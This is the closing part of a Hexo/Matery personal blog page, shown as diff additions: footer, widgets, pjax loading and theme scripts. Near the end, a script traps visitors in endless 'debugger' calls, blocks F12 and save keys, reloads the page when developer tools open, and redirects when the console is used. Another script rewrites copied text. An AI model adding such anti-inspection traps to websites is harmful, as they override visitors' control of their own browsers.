+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/Kali-Linux/">
+                        <span class="chip bg-color">Kali Linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/01/19/19/">
+                    <div class="card-image">
+                        
+                        <img src="https://img.imgdb.cn/item/6006c8b03ffa7d37b3e89792.jpg" class="responsive-img" alt="解决Git文件上传问题">
+                        
+                        <!-- 春节主题 小挂件 -->
+                        <div class="caishendeng"> 
+                            <div class="caishenxian">
+                                <img class="caishenpic lala" src="https://nekodeng.gitee.io/medias/spring-img/fudao.png"> 
+                            </div> 
+                        </div>
+                        <span class="card-title">解决Git文件上传问题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Git上传文件过大导致无法上传。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Git/" class="post-category">
+                                    Git
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                    <a href="/tags/Git/">
+                        <span class="chip bg-color">Git</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        // if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+        //     newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+       // }
+
+       newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MX<br />'
+            + '文章作者: Ming xin<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+    <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+    <div id="floating-toc-btn" class="hide-on-med-and-down">
+        <a class="btn-floating btn-large bg-color">
+            <i class="fas fa-list-ul"></i>
+        </a>
+    </div>
+
+
+<script>
+    $(function () {
+        getScript("/libs/tocbot/tocbot.min.js", function () {
+            tocbot.init({
+                tocSelector: '#toc-content',
+                contentSelector: '#articleContent',
+                headingsOffset: -($(window).height() * 0.4 - 45),
+                collapseDepth: Number('0'),
+                headingSelector: 'h2, h3, h4'
+            });
+        })
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+</main>
+
+<style>
+    .youpaiyunlogo {
+        height: 26px;
+        display: inline-block;
+        vertical-align: top;
+    }
+    .page-footer {
+        background-color: #000;
+    }
+</style>
+<footer class="page-footer">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <!-- 访客地图 -->
+        <div class="col s12 m3 l3 social-link" id="visitmap">
+            <a href="https://clustrmaps.com/site/1bf5x" target="_blank" rel="noopener" class="tooltipped" data-position="top" data-delay="50" data-tooltip="访客地图"><img src="http://clustrmaps.com/map_v2.png?d=cPCKl3BmH2jPlk6RoxDm1p745-hlsRzv5VwzSdCgh-Y&co=000000&cl=ffffff" /></a>
+        </div>
+        
+        <!-- 版权信息 -->
+        <div class="col s12 m6 l6 copy-right">
+            
+            <span id="icp"><img src="/medias/gxb.png" style="vertical-align: text-bottom;" />
+                <a href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank">蒙ICP备2020004573号-1</a>
+            </span>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=15012102000202" >蒙公网安备 15012102000202号</a>
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">running time</span>
+            <script>
+                function siteTime() {
+                    let seconds = 1000;
+                    let minutes = seconds * 60;
+                    let hours = minutes * 60;
+                    let days = hours * 24;
+                    let years = days * 365;
+                    let today = new Date();
+                    let startYear = "2020";
+                    let startMonth = "3";
+                    let startDate = "31";
+                    let startHour = "0";
+                    let startMinute = "0";
+                    let startSecond = "0";
+                    let todayYear = today.getFullYear();
+                    let todayMonth = today.getMonth() + 1;
+                    let todayDate = today.getDate();
+                    let todayHour = today.getHours();
+                    let todayMinute = today.getMinutes();
+                    let todaySecond = today.getSeconds();
+                    let t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    let t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    let diff = t2 - t1;
+                    let diffYears = Math.floor(diff / years);
+                    let diffDays = Math.floor((diff / days) - diffYears * 365);
+                    let diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    let diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    let diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "The site has been running for " + "<span class= 'white-color'>"+diffDays+"</span>" + " d " + "<span class= 'white-color'>"+diffHours+"</span>" +
+                            " h " + "<span class= 'white-color'>"+diffMinutes+"</span>" + " m " + "<span class= 'white-color'>"+diffSeconds+"</span>" + " s";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "The site has been running for " + "<span class= 'white-color'>"+diffYears+"</span>" + " y " + "<span class= 'white-color'>"+diffDays+"</span>" +
+                            " d " + "<span class= 'white-color'>"+diffHours+"</span>" + " h " + "<span class= 'white-color'>"+diffMinutes+"</span>" + " m " +"<span class= 'white-color'>"+ diffSeconds+"</span>" + " s";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">Ming xin</a>
+            &nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            &nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            &nbsp;<i class="far"></i>&nbsp;Total number of words: &nbsp;<span
+                class="white-color">31.5k</span>&nbsp;
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                &nbsp;<i class="far"></i>&nbsp;Total visits: &nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                &nbsp;<i class="far"></i>&nbsp;Total visits: &nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;
+            </span>
+            
+            <br>
+            
+            <a>Cloud storage</a> service and <a>CDN</a> acceleration provider
+            <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"  class="tooltipped"
+               target="_blank" data-position="top" data-delay="50"
+               data-tooltip="本站CDN加速/云存储由又拍云提供">
+                <img src="/medias/youpaiyun-logo.png" class="youpaiyunlogo"/>
+            </a>
+            <a href="https://www.jsdelivr.com/" class="tooltipped" target="_blank" data-position="top" data-delay="50" data-tooltip="部分CDN加速由jsdelivr提供">
+                <img src="https://cdn.jsdelivr.net/www.jsdelivr.com/b12b739cba83c021b7611978b6c944758e6c2aef/img/logo-horizontal.svg" class="youpaiyunlogo" />
+            </a>
+        </div>
+        <div class="col s12 m3 l3 social-link social-statis">
+
+
+    <a href="mailto:676940534@qq.com" title="邮箱联系我" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a title=QQ联系我 href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=676940534" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 676940534" data-position="top" data-delay="50"  >
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+
+</footer>
+<!-- 底部进度条 -->
+<div class="progress-bar" style="z-index: 999"></div>
+
+
+<aside id="rightside">
+    <!-- 回到顶部按钮 -->
+    <div id="backTop" class="top-scroll">
+        <a class="btn-floating btn-large waves-effect waves-light" href="#">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+    <!-- 春节主题 按钮 -->
+    <a onclick="switchThemes()" id="switchspring">
+        <img class="chunjiepic" src="/medias/spring-img/caishen.png" title="节日模式">
+    </a>
+    <!-- 深色模式 按钮 -->
+    <a onclick="switchNightMode()" id="sma">
+        <i class="fa fa-moon-o" id="nightMode" aria-hidden="true"></i>
+    </a>
+</aside>
+
+<resource id="script">
+    <!--  引入pjax  -->
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+    <script type="text/javascript">
+        var pjax = new Pjax({
+            selectors: [
+                "head title",
+                "main#main_wrap",
+                "#rightside"
+            ],
+            cache: true,
+            cacheBust: false
+        });
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart(){
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = "pjax_progress";
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max=10,mini=3;
+            var result=max-mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function(){
+                // 随机数
+                var num = parseInt(Math.random()*result);
+                var randomResult = num+mini;
+                // 累加
+                progress+=randomResult
+                document.getElementsByClassName("pjax_progress")[0].style.width = progress+"%";
+                // 当进度达到95%时停止
+                if(progress>95)progress=95
+            },500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish(){
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName("pjax_progress");
+            progress[0].style.width = "100%";
+            timer = setTimeout(function () {
+            progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+		document.addEventListener('pjax:send', function () {
+             document.getElementById("loading").style.display = "flex";
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+		document.addEventListener('pjax:complete', function () {
+                document.getElementById("loading").style.display = "none";
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exe_all_fn()
+
+            
+            // 图片懒加载
+                ImgLazyLoad("body img[data-img]","data-img")
+            
+
+            document.querySelectorAll('scripts[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ""
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    <!--  js依赖  -->
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+    <!--  内容搜索  -->
+    <div id="searchModal" class="modal" tabindex="0">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+<div class="modal-overlay" style="z-index: 100; opacity: 0.5;"></div>
+<script type="text/javascript">
+    function loadSearch() {
+        searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+    }
+    loadSearch()
+
+</script>
+    <!-- 音乐 -->
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<style>
+    div#aplayer {
+        position: sticky;
+        left: 0;
+        bottom: 0;
+        z-index: 9;
+    }
+
+    .aplayer .aplayer-lrc p {
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    span.aplayer-list-title {
+        color: #666;
+    }
+
+    .aplayer .aplayer-list ol li {
+        background-color: aliceblue;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div id="aplayer" 
+>
+    
+    <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+               server="tencent"
+               type="playlist"
+               id="7769642341"
+               fixed='true'
+               autoplay='true'
+               theme='#42b983'
+               loop='all'
+               order='random'
+               preload='auto'
+               volume='1'
+               list-folded='true'
+    >
+    </meting-js>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+        <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+        <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+        <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <!-- 天气 -->
+    <div id="tp-weather-widget"></div>
+    <script>
+        (function (a, h, g, f, e, d, c, b) {
+            b = function () {
+                d = h.createElement(g);
+                c = h.getElementsByTagName(g)[0];
+                d.src = e;
+                d.charset = "utf-8";
+                d.async = 1;
+                c.parentNode.insertBefore(d, c)
+            };
+            a["SeniverseWeatherWidgetObject"] = f;
+            a[f] || (a[f] = function () {
+                (a[f].q = a[f].q || []).push(arguments)
+            });
+            a[f].l = +new Date();
+            if (a.attachEvent) {
+                a.attachEvent("onload", b)
+            } else {
+                a.addEventListener("load", b, false)
+            }
+        }(window, document, "script", "SeniverseWeatherWidget", "//cdn.sencdn.com/widget2/static/js/bundle.js?t=" + parseInt((new Date().getTime() / 100000000).toString(), 10)));
+        window.SeniverseWeatherWidget('show', {
+            flavor: "bubble",
+            location: "WRR2Q2Z7CXWM",
+            geolocation: true,
+            language: "zh-Hans",
+            unit: "c",
+            theme: "auto",
+            token: "1827bac2-898a-4c4f-bc66-ae816694adee",
+            hover: "enabled",
+            container: "tp-weather-widget"
+        })
+        if (localStorage.getItem('dark') === '1') {
+            document.body.classList.add('dark');
+        } else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
+            document.body.classList.add('dark');
+        } else if (matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.body.classList.add('dark');
+        }
+    </script>
+    <!--  点击特效  -->
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script type="text/javascript" src="https://mingxin142.gitee.io/Mousedjtx/mcse1.js"></script>
+    <!--  评论特效  -->
+    <script src="https://cdn.jsdelivr.net/gh/suyin-long/activate-power-mode@1.0/dist/activate-power-mode.js"></script>
+    <script>
+        POWERMODE.colorful = true; // make power mode colorful
+        POWERMODE.shake = false; // turn off shake
+        document.body.addEventListener('input', POWERMODE);
+    </script>
+
+    <script>
+        //隐藏右键
+        // document.oncontextmenu = function (event){
+        //     if(window.event){
+        //     event = window.event;
+        //     }try{
+        //     var the = event.srcElement;
+        //     if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")){
+        //     return false;
+        //     }
+        //     return true;
+        //     }catch (e){
+        //     return false;
+        //     }
+        // }
+
+        // debugger部分
+        setInterval(function() {
+            check();
+        }, 500);
+        var check = function() {
+            function doCheck(a) {
+                if (('' + a / a)['length'] !== 1 || a % 20 === 0) {
+                    (function() {}['constructor']('debugger')());
+                } else {
+                    (function() {}['constructor']('debugger')());
+                }
+                doCheck(++a);
+            }
+            try {
+                doCheck(0);
+            } catch (err) {}
+        };
+        check();
+
+        // ctrl+s保存
+        document.onkeydown = function() {
+            if ((e.ctrlKey) && (e.keyCode == 83)) { //ctrl+s
+                return false;
+            }
+        }
+        window.addEventListener("keydown", function(e) {
+            //可以判断是不是mac，如果是mac,ctrl变为花键
+            //event.preventDefault() 方法阻止元素发生默认的行为。
+            if((e.key=='s'||e.key=='S')&&(navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)){
+                e.preventDefault();
+            }
+        }, false);
+        // F12
+        document.onkeydown = function(){
+            if(window.event && window.event.keyCode == 123) {
+                event.keyCode=0;
+                event.returnValue=false;
+            }
+            if(window.event && window.event.keyCode == 13) {
+                window.event.keyCode = 505;
+            }
+            if(window.event && window.event.keyCode == 8) {
+                window.event.returnValue=false;
+            }
+        }
+        //宽高
+        var threshold = 160; // 打开控制台的宽或高阈值
+        // // 每秒检查一次
+        window.setInterval(function() {
+            if (window.outerWidth - window.innerWidth > threshold ||
+                window.outerHeight - window.innerHeight > threshold) {
+                // 如果打开控制台，则刷新页面
+                window.location.reload();
+            }
+        }, 1e3);
+
+        //debug调试时跳转页面
+        var element = new Image();
+        Object.defineProperty(element,'id',{get:function(){window.location.href="https://pic.downk.cc/item/5fe1a6073ffa7d37b349bf90.jpg"}});
+        console.log(element);
+    </script>
+
+</resource>
+
+</body>
+
+</html>
+
+
